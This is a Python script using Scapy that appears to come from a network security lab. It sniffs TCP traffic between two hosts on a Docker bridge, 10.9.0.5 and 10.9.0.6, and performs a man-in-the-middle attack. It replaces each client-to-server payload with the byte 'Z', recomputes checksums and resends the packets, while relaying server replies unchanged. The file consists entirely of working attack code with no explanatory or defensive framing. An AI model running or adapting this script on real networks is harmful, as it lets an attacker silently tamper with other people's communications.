#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    # Client → Server (modify)
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt.haslayer(Raw):

        orig = pkt[Raw].load
        print("ORIGINAL:", orig)

        newdata = b"Z"                     # modify character

        # reconstruct packet
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        print("SPOOFED: Z")
        send(newpkt/newdata, verbose=0)
        return

    # Server → Client (unchanged)
    if pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt, verbose=0)
        return

# very important filter: capture only original packets, not our spoofed ones
sniff(iface="br-f55ccea4134c",
      filter=f"tcp and not ether src 02:42:0a:09:00:06 and not ether src 02:42:0a:09:00:05",
      prn=spoof_pkt)
